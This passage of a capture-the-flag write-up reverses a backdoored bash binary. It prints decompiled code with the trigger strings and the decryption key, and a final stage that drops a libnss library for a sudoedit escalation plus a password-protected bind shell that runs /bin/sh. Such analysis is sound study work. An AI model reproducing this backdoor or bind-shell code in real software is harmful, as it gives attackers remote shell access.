    <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">~</span>(strlen((<span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)a1) <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">~</span><span style="color:#bd93f9">0x29uLL</span> <span style="color:#ff79c6">&amp;&amp;</span> <span style="color:#ff79c6">!</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)memcmp_0(a1, <span style="color:#f1fa8c">&#34;1+2+3+4+5&#34;</span>, <span style="color:#bd93f9">9LL</span>) )
    {
      ((<span style="color:#8be9fd">void</span> (<span style="color:#ff79c6">__fastcall</span> <span style="color:#ff79c6">*</span>)(<span style="color:#ff79c6">__int64</span>))(v3 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">91</span>))(a1 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">9</span>);
      v6 <span style="color:#ff79c6">=</span> sh_malloc(<span style="color:#bd93f9">4096LL</span>, <span style="color:#f1fa8c">&#34;evalstring.c&#34;</span>, <span style="color:#bd93f9">194LL</span>);
      <span style="color:#ff79c6">*</span>(_QWORD <span style="color:#ff79c6">*</span>)(v6 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">4088</span>) <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0LL</span>;
      <span style="color:#6272a4">// v6 = mkfifo path from the other binary, snipped bc noisy string obfu
</span><span style="color:#6272a4"></span>      mkfifo_0(v6, <span style="color:#bd93f9">438LL</span>);
      v9 <span style="color:#ff79c6">=</span> open_0(v6, <span style="color:#bd93f9">0LL</span>);
      buf[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0LL</span>;
      buf[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0LL</span>;
      read_0(v9, buf, <span style="color:#bd93f9">1</span>);
      close_0(v9);
      print_free(v6, <span style="color:#f1fa8c">&#34;evalstring.c&#34;</span>, <span style="color:#bd93f9">511LL</span>);
      <span style="color:#ff79c6">if</span> ( LOBYTE(buf[<span style="color:#bd93f9">0</span>]) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">1</span> )
      {
        xmmword_14F320 <span style="color:#ff79c6">=</span> (__int128)_mm_loadu_si128((<span style="color:#ff79c6">const</span> <span style="color:#ff79c6">__m128i</span> <span style="color:#ff79c6">*</span>)(a1 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">9</span>));
        qword_14F330 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_QWORD <span style="color:#ff79c6">*</span>)(a1 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">25</span>);
        dword_14F338 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)(a1 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">33</span>);
        word_14F33C <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_WORD <span style="color:#ff79c6">*</span>)(a1 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">37</span>);
        byte_14F33E <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(a1 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">39</span>);
        backdoor_activation((<span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)(a1 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">9</span>));
      }
}

</code></pre></div><p>The backdoor is triggered when entering &ldquo;1+2+3+4+5&rdquo; followed by the string we found before. The <code>((void (__fastcall *)(__int64))(v3 + 91))(a1 + 9)</code> function spawns the decrypted binary we analyzed thanks to a memfd, with the string we got as a parameter. So we can trigger the code with the command</p>
<pre tabindex="0"><code>1+2+3+4+50NSlH7m8C91boiGq10NtQKq4aP7mVyJ
</code></pre><p>With that, we can reach <code>backdoor_activation</code> which call some crypto func with <code>0NSlH7m8C91boiGq10NtQKq4aP7mVyJ</code> as key to decrypt the function which will check the &ldquo;JAKWEULOD&rdquo; variable environment:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
<span style="color:#8be9fd">void</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">backdoor_activation</span>(<span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>key)
{
  <span style="color:#ff79c6">__int64</span> v1; <span style="color:#6272a4">// rbp
</span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>v2; <span style="color:#6272a4">// rax
</span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">const</span> <span style="color:#ff79c6">__m128i</span> <span style="color:#ff79c6">*</span>v3; <span style="color:#6272a4">// rbx
</span><span style="color:#6272a4"></span>
  v1 <span style="color:#ff79c6">=</span> mmap_0(<span style="color:#bd93f9">0LL</span>, <span style="color:#bd93f9">98323</span>, <span style="color:#bd93f9">7</span>, <span style="color:#bd93f9">34</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>);
  cryptoshit_again((<span style="color:#ff79c6">__int64</span>)key, (<span style="color:#ff79c6">__int64</span>)<span style="color:#ff79c6">&amp;</span>unk_12B000, v1, <span style="color:#bd93f9">98323LL</span>, strlen(key));
  v2 <span style="color:#ff79c6">=</span> (<span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)getenv(<span style="color:#f1fa8c">&#34;JAKWEULOD&#34;</span>);
  <span style="color:#ff79c6">if</span> ( v2 )
  {
    v3 <span style="color:#ff79c6">=</span> (<span style="color:#ff79c6">const</span> <span style="color:#ff79c6">__m128i</span> <span style="color:#ff79c6">*</span>)v2;
    <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">~</span>(strlen(v2) <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">~</span><span style="color:#bd93f9">65LL</span> <span style="color:#ff79c6">&amp;&amp;</span> ((<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> (<span style="color:#ff79c6">__fastcall</span> <span style="color:#ff79c6">*</span>)(<span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>))(v1 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">143</span>))(v2) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">1</span> )
    {
      kk1 <span style="color:#ff79c6">=</span> (__int128)_mm_loadu_si128(v3);
      xmmword_14F430 <span style="color:#ff79c6">=</span> (__int128)_mm_loadu_si128(v3 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>);
      xmmword_14F440 <span style="color:#ff79c6">=</span> (__int128)_mm_loadu_si128(v3 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">2</span>);
      unk_14F450 <span style="color:#ff79c6">=</span> _mm_loadu_si128(v3 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">3</span>);
      sub_89675();
      fork_and_spawn();
    }
  }
  munmap_0(v1, <span style="color:#bd93f9">98323LL</span>);
}

</code></pre></div><p>Since I&rsquo;m lazy, I attempted to patch the binary with an &ldquo;int3&rdquo; breakpoint, but bash sets up its own sighandler and catches int3, so I landed in to the sighandler func.</p>
<p>To avoid this, I replaced the &ldquo;int3&rdquo; by a &ldquo;jmp $0&rdquo; (<code>&quot;\xeb\xfe\&quot;</code>), and dumped the content of the allocated buffer after calling the crypto function after attaching to the process with gdb.</p>
<p>The allocated buffer is called as function to check &ldquo;JAKWEULOD&rdquo; contents: <code>((unsigned int (__fastcall *)(const char *))(v1 + 143))(v2)</code>.</p>
<p>The checking algorithm is pretty simple: it does a modular exponentiation on each char of the variable and check if the results equals a certain value. Unfortunately the modulus isn&rsquo;t a prime number, but since the modulus is small we can do dumb bruteforce to determine the correct char:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">bf_char</span>(n, p, res):
    selected <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>
    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">0x10</span>, <span style="color:#bd93f9">0x7f</span>):
        <span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">pow</span>(i, n, p) <span style="color:#ff79c6">==</span> res:
            <span style="color:#ff79c6">if</span> selected <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>:
                selected <span style="color:#ff79c6">=</span> i
            <span style="color:#ff79c6">else</span>:
                <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Other candidate </span><span style="color:#f1fa8c">%d</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#ff79c6">%</span> i)
    <span style="color:#ff79c6">return</span> selected

</code></pre></div><p>I was too lazy to make a script to extract the exponent, modulus and the powmod value so I did by hand (fortunately b33r helps to do boring tasks) to compute the JAKWEULOD value. So after running the script which looks like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">bf_char</span>(n, p, res):
    selected <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>
    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">0x10</span>, <span style="color:#bd93f9">0x7f</span>):
        <span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">pow</span>(i, n, p) <span style="color:#ff79c6">==</span> res:
            <span style="color:#ff79c6">if</span> selected <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>:
                selected <span style="color:#ff79c6">=</span> i
            <span style="color:#ff79c6">else</span>:
                <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Other candidate </span><span style="color:#f1fa8c">%d</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#ff79c6">%</span> i)
    <span style="color:#ff79c6">return</span> selected

flag <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">bytearray</span>(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;-&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">65</span>)

elts <span style="color:#ff79c6">=</span> [
    (<span style="color:#bd93f9">0x7b7bc</span>, <span style="color:#bd93f9">0x3fa</span>, <span style="color:#bd93f9">0x6af18</span>, <span style="color:#bd93f9">4</span>),
    (<span style="color:#bd93f9">0x3fbeb</span>, <span style="color:#bd93f9">0x2a1</span>, <span style="color:#bd93f9">0xd56d</span>, <span style="color:#bd93f9">0xd</span>),
<span style="color:#6272a4"># snipped</span>
    (<span style="color:#bd93f9">0x3dbca</span>, <span style="color:#bd93f9">0x377</span>, <span style="color:#bd93f9">0x5de6</span>, <span style="color:#bd93f9">0x10</span>)

]

<span style="color:#ff79c6">for</span> e <span style="color:#ff79c6">in</span> elts:
    c <span style="color:#ff79c6">=</span> bf_char(e[<span style="color:#bd93f9">1</span>], e[<span style="color:#bd93f9">0</span>], e[<span style="color:#bd93f9">2</span>])
    <span style="color:#6272a4">#print(hex(e[3]))</span>
    flag[e[<span style="color:#bd93f9">3</span>]] <span style="color:#ff79c6">=</span> c

<span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#8be9fd;font-style:italic">len</span>(elts))
<span style="color:#8be9fd;font-style:italic">print</span>(flag)
pos <span style="color:#ff79c6">=</span> [<span style="color:#8be9fd;font-style:italic">hex</span>(i) <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#8be9fd;font-style:italic">len</span>(flag)) <span style="color:#ff79c6">if</span> flag[i] <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">ord</span>(<span style="color:#f1fa8c">&#34;-&#34;</span>)]
<span style="color:#8be9fd;font-style:italic">print</span>(pos)

</code></pre></div><p>we get the correct value for the env var: <code>mIB8vFxWAQ5RkO7MXzDKnjTbYIdbwQQbxSyU6XvIoS39zmdKrHHCOevfUt5oBDZh</code>.</p>
<p>As usual, this value is a key to decrypt the next payload, but once again the <code>jmp $0</code> trick will help us and we can dump the &ldquo;final&rdquo; stage:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
<span style="color:#8be9fd">void</span> <span style="color:#50fa7b">fork_and_spawn</span>()
{
  <span style="color:#ff79c6">__m128i</span> <span style="color:#ff79c6">*</span>key; <span style="color:#6272a4">// rbx
</span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">__int64</span> v1; <span style="color:#6272a4">// rax
</span><span style="color:#6272a4"></span>  _BYTE v2[<span style="color:#bd93f9">1648</span>]; <span style="color:#6272a4">// [rsp-1CF8h] [rbp-DD10h] BYREF
</span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">__int64</span> v3; <span style="color:#6272a4">// [rsp-1688h] [rbp-D6A0h] BYREF
</span><span style="color:#6272a4"></span>  _QWORD v4[<span style="color:#bd93f9">5841</span>]; <span style="color:#6272a4">// [rsp-688h] [rbp-C6A0h] BYREF
</span><span style="color:#6272a4"></span>
  <span style="color:#ff79c6">while</span> ( <span style="color:#ff79c6">&amp;</span>v3 <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">&amp;</span>v4[<span style="color:#ff79c6">-</span><span style="color:#bd93f9">6144</span>] )
    ;
  v4[<span style="color:#bd93f9">5631</span>] <span style="color:#ff79c6">=</span> __readfsqword(<span style="color:#bd93f9">0x28u</span>);
  memcpy_0(v2, <span style="color:#ff79c6">&amp;</span>unk_ECB08, <span style="color:#bd93f9">50784</span>);
  key <span style="color:#ff79c6">=</span> (<span style="color:#ff79c6">__m128i</span> <span style="color:#ff79c6">*</span>)sh_malloc(<span style="color:#bd93f9">64LL</span>, <span style="color:#f1fa8c">&#34;evalstring.c&#34;</span>, <span style="color:#bd93f9">401LL</span>);
  key<span style="color:#ff79c6">-&gt;</span>m128i_i64[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0LL</span>;
  key<span style="color:#ff79c6">-&gt;</span>m128i_i64[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0LL</span>;
  key[<span style="color:#bd93f9">1</span>].m128i_i64[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0LL</span>;
  key[<span style="color:#bd93f9">1</span>].m128i_i64[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0LL</span>;
  key[<span style="color:#bd93f9">2</span>].m128i_i64[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0LL</span>;
  key[<span style="color:#bd93f9">2</span>].m128i_i64[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0LL</span>;
  key[<span style="color:#bd93f9">3</span>].m128i_i64[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0LL</span>;
  key[<span style="color:#bd93f9">3</span>].m128i_i64[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0LL</span>;
  <span style="color:#ff79c6">*</span>key <span style="color:#ff79c6">=</span> _mm_load_si128((<span style="color:#ff79c6">const</span> <span style="color:#ff79c6">__m128i</span> <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;</span>xmmword_14F220);
  key[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">=</span> _mm_load_si128((<span style="color:#ff79c6">const</span> <span style="color:#ff79c6">__m128i</span> <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;</span>xmmword_14F230);
  key[<span style="color:#bd93f9">2</span>] <span style="color:#ff79c6">=</span> _mm_load_si128((<span style="color:#ff79c6">const</span> <span style="color:#ff79c6">__m128i</span> <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;</span>xmmword_14F240);
  key[<span style="color:#bd93f9">3</span>] <span style="color:#ff79c6">=</span> _mm_load_si128((<span style="color:#ff79c6">const</span> <span style="color:#ff79c6">__m128i</span> <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;</span>xmmword_14F250);
  v1 <span style="color:#ff79c6">=</span> sh_malloc(<span style="color:#bd93f9">50784LL</span>, <span style="color:#f1fa8c">&#34;evalstring.c&#34;</span>, <span style="color:#bd93f9">404LL</span>);
  cryptoshit_again((<span style="color:#ff79c6">__int64</span>)key, (<span style="color:#ff79c6">__int64</span>)v2, v1, <span style="color:#bd93f9">50784LL</span>, <span style="color:#bd93f9">64LL</span>);
  <span style="color:#ff79c6">while</span> ( <span style="color:#bd93f9">1</span> ) <span style="color:#6272a4">// jmp $0 rocks :þ
</span><span style="color:#6272a4"></span>    ;
}

</code></pre></div><p>We finally see the end of the tunnel, and dump the dropped ELF with gdb after attaching to the process.</p>
<h2 id="final-flash">Final flash</h2>
<p>After having dumped the ELF, we open it on IDA. This time, no weird tricks and IDA shows us the main function directly. The main function is useless because it just calls &ldquo;sudoedit&rdquo; with shitty arguments.</p>
<p>But remember, init functions can be called by <code>__libc_csu_init</code>, and it&rsquo;s the case here. We have a <code>setup</code> function, which does this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
<span style="color:#8be9fd">int</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">setup</span>(<span style="color:#ff79c6">__int64</span> a1, __mode_t a2)
{
  FILE <span style="color:#ff79c6">*</span>s; <span style="color:#6272a4">// [rsp+8h] [rbp-8h]
</span><span style="color:#6272a4"></span>  FILE <span style="color:#ff79c6">*</span>sa; <span style="color:#6272a4">// [rsp+8h] [rbp-8h]
</span><span style="color:#6272a4"></span>
  mkdir(<span style="color:#f1fa8c">&#34;libnss_X&#34;</span>, a2);
  s <span style="color:#ff79c6">=</span> fopen(<span style="color:#f1fa8c">&#34;libnss_X/A .so.2&#34;</span>, <span style="color:#f1fa8c">&#34;w&#34;</span>);
  fwrite(<span style="color:#ff79c6">&amp;</span>libData, <span style="color:#bd93f9">1uLL</span>, <span style="color:#bd93f9">0x4080uLL</span>, s);
  fclose(s);
  sa <span style="color:#ff79c6">=</span> fopen(<span style="color:#f1fa8c">&#34;/tmp/shellbind&#34;</span>, <span style="color:#f1fa8c">&#34;w&#34;</span>);
  fwrite(<span style="color:#ff79c6">&amp;</span>shellData, <span style="color:#bd93f9">1uLL</span>, <span style="color:#bd93f9">0x4300uLL</span>, sa);
  <span style="color:#ff79c6">return</span> fclose(sa);
}

</code></pre></div><p>Luckily for me, I analyzed the &ldquo;shellbind&rdquo; binary, and after seening its main function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
bind(fd, <span style="color:#ff79c6">&amp;</span>addr, <span style="color:#bd93f9">0x10u</span>);
listen(fd, <span style="color:#bd93f9">0</span>);
v8 <span style="color:#ff79c6">=</span> accept(fd, <span style="color:#bd93f9">0LL</span>, <span style="color:#bd93f9">0LL</span>);
v9 <span style="color:#ff79c6">=</span> recv(v8, buf, <span style="color:#bd93f9">0x28uLL</span>, <span style="color:#bd93f9">0</span>);
<span style="color:#ff79c6">if</span> ( buf[v9 <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">10</span> )
  buf[v9 <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
<span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">37</span>; <span style="color:#ff79c6">++</span>i )
  buf[i] <span style="color:#ff79c6">^=</span> <span style="color:#bd93f9">0x59u</span>;
<span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>strcmp(buf, <span style="color:#ff79c6">&amp;</span>unk_2008) )
{
  dup2(v8, <span style="color:#bd93f9">2</span>);
  dup2(v8, <span style="color:#bd93f9">1</span>);
  dup2(v8, <span style="color:#bd93f9">0</span>);
  execve(<span style="color:#f1fa8c">&#34;/bin/sh&#34;</span>, <span style="color:#bd93f9">0LL</span>, <span style="color:#bd93f9">0LL</span>);
}

</code></pre></div><p>I found the password of the backdoor:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
s <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">bytes</span><span style="color:#ff79c6">.</span>fromhex(<span style="color:#f1fa8c">&#34;183C2B36226D603B6861686A616E3F6C69606A6C3B6A60386969616C693B6E6E613A6F6F3F24&#34;</span>)

<span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#8be9fd;font-style:italic">bytes</span>([x <span style="color:#ff79c6">^</span> <span style="color:#bd93f9">0x59</span> <span style="color:#ff79c6">for</span> x <span style="color:#ff79c6">in</span> s]))

</code></pre></div><p>Which gives us the flag: <code>Aero{49b181387f50935b39a00850b778c66f}</code></p>

    </div>
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
